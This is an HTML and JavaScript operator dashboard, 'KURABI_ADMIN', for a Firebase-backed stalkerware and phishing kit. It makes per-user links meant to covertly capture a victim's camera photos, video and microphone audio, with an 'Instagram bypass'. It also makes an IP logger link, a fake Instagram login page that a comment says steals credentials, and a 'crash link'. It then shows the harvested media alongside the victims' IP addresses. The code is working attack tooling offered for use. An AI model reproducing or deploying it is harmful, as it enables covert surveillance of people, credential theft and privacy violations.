<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>⛧ KURABI_ADMIN ⛧</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0c15;font-family:'Courier New',monospace;padding:16px}
        .container{max-width:1300px;margin:0 auto}
        .header{background:#0f111a;border-bottom:2px solid #0f0;padding:12px 20px;margin-bottom:24px;border-radius:16px 16px 0 0;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
        .title{color:#0f0;font-size:1.6rem;text-shadow:0 0 8px #0f0}
        .title span{color:#f36}
        .access-badge{background:#0f011;border:1px solid #0f0;padding:6px 16px;border-radius:30px;font-size:.7rem;color:#0f0}
        .lang-btn,.logout-btn{background:#1a1d2e;border:1px solid #2a2e44;color:#ccc;padding:6px 16px;border-radius:30px;cursor:pointer}
        .logout-btn{background:#f36;border-color:#f36;color:#fff}
        .stats-grid{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:24px}
        .stat-card{background:#0f111a;border:1px solid #2a2e44;border-radius:20px;padding:16px 24px;flex:1;text-align:center}
        .stat-card h4{color:#888;font-size:.7rem}
        .stat-card .value{color:#0f0;font-size:1.8rem;font-weight:bold}
        .panel{background:#0f111a;border:1px solid #2a2e44;border-radius:24px;padding:20px;margin-bottom:24px}
        .panel h3{color:#0f0;margin-bottom:18px;border-left:3px solid #f36;padding-left:14px}
        .duration-slider{display:flex;align-items:center;gap:16px;flex-wrap:wrap;background:#0a0c15;padding:12px 16px;border-radius:40px;margin-bottom:20px}
        .duration-value{background:#0f02;color:#0f0;padding:4px 14px;border-radius:30px}
        .btn-group-custom{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px}
        .btn-primary{background:0 0;border:1px solid #0f0;color:#0f0;padding:10px 20px;border-radius:40px;cursor:pointer}
        .btn-primary:hover{background:#0f0;color:#000}
        .btn-instagram{border-color:#f36;color:#f36}
        .btn-instagram:hover{background:#f36;color:#fff}
        .btn-hack{border-color:#fa0;color:#fa0}
        .btn-hack:hover{background:#fa0;color:#000}
        .output-box{background:#0a0c15;border:1px dashed #0f0;border-radius:16px;padding:14px;font-size:.7rem;word-break:break-all;margin-top:15px}
        .copy-btn{background:#0f0;border:none;padding:4px 12px;border-radius:20px;cursor:pointer;margin-left:8px}
        .card{background:#0f111a;border:1px solid #2a2e44;border-radius:20px;margin-bottom:16px}
        .card-header{background:#0a0c15;padding:12px 16px;border-bottom:1px solid #2a2e44;display:flex;justify-content:space-between;flex-wrap:wrap}
        .card-header .ip{color:#0f0}
        .media-strip{display:flex;overflow-x:auto;gap:12px;padding:16px}
        .media-strip img,.media-strip video{width:100px;height:100px;object-fit:cover;border:2px solid #0f0;border-radius:12px;cursor:pointer}
        .download-btn,.delete-single{padding:6px 14px;border-radius:30px;border:none;cursor:pointer}
        .download-btn{background:#0f0;color:#000}
        .delete-single{background:#f36;color:#fff}
        .loading{text-align:center;color:#0f0;padding:40px}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.97);z-index:2000;justify-content:center;align-items:center}
        .modal img,.modal video{max-width:90%;max-height:90%;border:2px solid #0f0;border-radius:16px}
        .modal-close{position:absolute;top:20px;right:30px;color:#0f0;font-size:36px;cursor:pointer}
    </style>
</head>
<body>
<div class="container">
    <div class="header"><div class="title">⛧ <span>KURABI</span>_ADMIN ⛧</div><div><button class="lang-btn" id="langBtn">🌐 EN</button><button class="logout-btn" id="logoutBtn">⛧ EXIT</button></div></div>
    <div class="stats-grid"><div class="stat-card"><h4>MY CAPTURES</h4><div class="value" id="captureCount">0</div></div><div class="stat-card"><h4>TOTAL MEDIA</h4><div class="value" id="mediaCount">0</div></div></div>
    <div class="panel"><h3>📸 CAMERA LINK</h3><div class="duration-slider"><span>🎬 DURATION:</span><input type="range" id="videoDuration" min="1" max="60" value="6"><span class="duration-value" id="durationValue">6 sec</span></div><div class="btn-group-custom"><button class="btn-primary" id="genPhotoBtn">📸 PHOTO</button><button class="btn-primary" id="gen5PhotoBtn">📸 5 PHOTOS</button><button class="btn-primary" id="genVideoOnlyBtn">🎬 VIDEO</button><button class="btn-primary" id="genAudioBtn">🎤 AUDIO</button><button class="btn-primary" id="genVideoAudioBtn">🎬🎤 VIDEO+AUDIO</button></div><div class="output-box" id="linkOutput"></div></div>
    <div class="panel"><h3>📱 INSTAGRAM BYPASS</h3><div class="btn-group-custom"><button class="btn-primary btn-instagram" id="igPhotoBtn">📸 INSTA PHOTO</button><button class="btn-primary btn-instagram" id="ig5PhotoBtn">📸 INSTA 5 PHOTOS</button><button class="btn-primary btn-instagram" id="igVideoOnlyBtn">🎬 INSTA VIDEO</button><button class="btn-primary btn-instagram" id="igAudioBtn">🎤 INSTA AUDIO</button><button class="btn-primary btn-instagram" id="igVideoAudioBtn">🎬🎤 INSTA VIDEO+AUDIO</button></div><div class="output-box" id="igLinkOutput"></div></div>
    <div class="panel"><h3>⚡ HACK TOOLS</h3><div class="btn-group-custom"><button class="btn-primary btn-hack" id="ipLoggerBtn">📡 IP LOGGER</button><button class="btn-primary btn-hack" id="fakeWABtn">🔐 FAKE INSTAGRAM</button><button class="btn-primary btn-hack" id="crashBtn">💀 CRASH LINK</button></div><div class="output-box" id="hackOutput"></div></div>
    <div class="btn-group-custom"><button class="btn-primary" id="refreshBtn">⟳ REFRESH</button><button class="btn-primary" id="clearAllBtn">⛧ CLEAR ALL</button></div>
    <div id="list"></div>
</div>
<div id="modal" class="modal"><span class="modal-close">✕</span><div id="modalContent"></div></div>
<script src="config.js"></script>
<script type="importmap">{"imports":{"firebase/app":"https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js","firebase/auth":"https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js","firebase/firestore":"https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"}}</script>
<script type="module">
import{initializeApp}from"firebase/app";import{getAuth,onAuthStateChanged,signOut}from"firebase/auth";import{getFirestore,collection,query,where,getDocs,deleteDoc,doc}from"firebase/firestore";const app=initializeApp(window.FIREBASE_CONFIG);const auth=getAuth(app);const db=getFirestore(app);let user=null,lang='en';const t={en:{copy:"COPY",link:"🔗 LINK:",del:"DELETE",dl:"⬇ DOWNLOAD",confirm:"Delete?",confirmAll:"Delete ALL?",loading:"LOADING...",nodata:"[NO DATA]",sec:"sec",photo:"PHOTO",photos:"PHOTOS",video:"VIDEO",audio:"AUDIO"},ar:{copy:"نسخ",link:"🔗 الرابط:",del:"حذف",dl:"⬇ تحميل",confirm:"حذف؟",confirmAll:"مسح الكل؟",loading:"جاري التحميل...",nodata:"[لا توجد بيانات]",sec:"ثانية",photo:"صورة",photos:"صور",video:"فيديو",audio:"صوت"}};function _(k){return t[lang][k]||t.en[k]}function applyLang(){document.getElementById('durationValue').innerText=document.getElementById('videoDuration').value+' '+_('sec');document.getElementById('langBtn').innerHTML=lang==='en'?'🇸🇦 AR':'🇬🇧 EN'}document.getElementById('videoDuration').oninput=()=>{document.getElementById('durationValue').innerText=document.getElementById('videoDuration').value+' '+_('sec')};document.getElementById('langBtn').onclick=()=>{lang=lang==='en'?'ar':'en';localStorage.setItem('lang',lang);applyLang();loadData()};async function loadData(){if(!user)return;const div=document.getElementById('list');div.innerHTML=`<div class="loading">${_('loading')}</div>`;try{const q=query(collection(db,"captures"),where("userId","==",user.uid));const snap=await getDocs(q);let items=[],total=0;snap.forEach(d=>{const data=d.data();items.push({id:d.id,...data});total+=data.media?.length||0});items.sort((a,b)=>(b.unix||0)-(a.unix||0));document.getElementById('captureCount').innerText=items.length;document.getElementById('mediaCount').innerText=total;if(!items.length){div.innerHTML=`<div class="loading">${_('nodata')}</div>`;return}let html='';for(let it of items){const date=new Date(it.timestamp);let modeText='';if(it.mode==='photo')modeText=_('photo');else if(it.mode==='5photos')modeText=_('photos');else if(it.mode==='videoonly')modeText=_('video');else if(it.mode==='audio')modeText=_('audio');else if(it.mode==='videoaudio')modeText='VIDEO+AUDIO';let mediaHtml='';for(let m of it.media){if(m.match(/\.(mp4|webm|mov)/i))mediaHtml+=`<video src="${m}" onclick="window.showMedia('${m}',true)"></video>`;else mediaHtml+=`<img src="${m}" onclick="window.showMedia('${m}',false)">`}html+=`<div class="card"><div class="card-header"><div class="ip">🌐 IP: ${it.ip||'?'}</div><div>${date.toLocaleString()} | ${modeText}</div></div><div class="media-strip">${mediaHtml}</div><div class="card-footer"><button class="download-btn" onclick="window.downloadAll(${JSON.stringify(it.media).replace(/"/g,'&quot;')})">${_('dl')}</button><button class="delete-single" onclick="window.deleteCap('${it.id}')">🗑 ${_('del')}</button></div></div>`}div.innerHTML=html}catch(e){div.innerHTML=`<div class="loading">❌ ${e.message}</div>`}}window.downloadAll=async(urls)=>{for(let u of urls){let a=document.createElement('a');a.href=u;a.download=u.split('/').pop()||'media';a.click();await new Promise(r=>setTimeout(r,300))}};window.showMedia=(url,isVideo)=>{const modal=document.getElementById('modal');const cont=document.getElementById('modalContent');if(isVideo)cont.innerHTML=`<video src="${url}" controls autoplay></video>`;else cont.innerHTML=`<img src="${url}">`;modal.style.display='flex'};window.deleteCap=async(id)=>{if(!confirm(_('confirm')))return;await deleteDoc(doc(db,"captures",id));await loadData()};async function clearAll(){if(!confirm(_('confirmAll')))return;const q=query(collection(db,"captures"),where("userId","==",user.uid));const snap=await getDocs(q);for(let d of snap.docs)await deleteDoc(doc(db,"captures",d.id));await loadData()}function genLink(mode,insta=false){if(!user)return;let url=`${location.origin}/index.html?mode=${mode}&uid=${user.uid}`;if(['videoonly','videoaudio','audio'].includes(mode))url+=`&duration=${document.getElementById('videoDuration').value}`;if(insta)url+=`&force_chrome=1`;const div=insta?document.getElementById('igLinkOutput'):document.getElementById('linkOutput');div.innerHTML=`${_('link')} <a href="${url}" target="_blank" style="color:#0f0">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${_('copy')}</button>`;if(insta)div.innerHTML+=`<br><small>✅ Instagram Chrome Bypass</small>`}function genIPLogger(){if(!user)return;const u=`${location.origin}/hack/iplogger.html?uid=${user.uid}&redirect=https://google.com`;document.getElementById('hackOutput').innerHTML=`${_('link')} 📡 IP LOGGER: <a href="${u}" target="_blank" style="color:#fa0">${u}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${u}')">${_('copy')}</button>`}function genFakeIG(){if(!user)return;const u=`${location.origin}/hack/fakeinstagram.html?uid=${user.uid}`;document.getElementById('hackOutput').innerHTML=`${_('link')} 🔐 FAKE INSTAGRAM: <a href="${u}" target="_blank" style="color:#fa0">${u}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${u}')">${_('copy')}</button><br><small>Instagram giriş bilgilerini çalar</small>`}function genCrash(){if(!user)return;const u=`${location.origin}/index.html?crash=1&uid=${user.uid}`;document.getElementById('hackOutput').innerHTML=`${_('link')} 💀 CRASH: <a href="${u}" target="_blank" style="color:red">${u}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${u}')">${_('copy')}</button>`}document.getElementById('genPhotoBtn').onclick=()=>genLink('photo',0);document.getElementById('gen5PhotoBtn').onclick=()=>genLink('5photos',0);document.getElementById('genVideoOnlyBtn').onclick=()=>genLink('videoonly',0);document.getElementById('genAudioBtn').onclick=()=>genLink('audio',0);document.getElementById('genVideoAudioBtn').onclick=()=>genLink('videoaudio',0);document.getElementById('igPhotoBtn').onclick=()=>genLink('photo',1);document.getElementById('ig5PhotoBtn').onclick=()=>genLink('5photos',1);document.getElementById('igVideoOnlyBtn').onclick=()=>genLink('videoonly',1);document.getElementById('igAudioBtn').onclick=()=>genLink('audio',1);document.getElementById('igVideoAudioBtn').onclick=()=>genLink('videoaudio',1);document.getElementById('ipLoggerBtn').onclick=genIPLogger;document.getElementById('fakeWABtn').onclick=genFakeIG;document.getElementById('crashBtn').onclick=genCrash;document.getElementById('refreshBtn').onclick=loadData;document.getElementById('clearAllBtn').onclick=clearAll;document.getElementById('logoutBtn').onclick=async()=>{await signOut(auth);location.href='login.html'};const modal=document.getElementById('modal');modal.onclick=(e)=>{if(e.target===modal||e.target.classList.contains('modal-close')){modal.style.display='none';document.getElementById('modalContent').innerHTML=''}};onAuthStateChanged(auth,async(u)=>{if(u){user=u;applyLang();await loadData()}else location.href='login.html'});lang=localStorage.getItem('lang')||'en';applyLang();
</script>
</body>
</html>
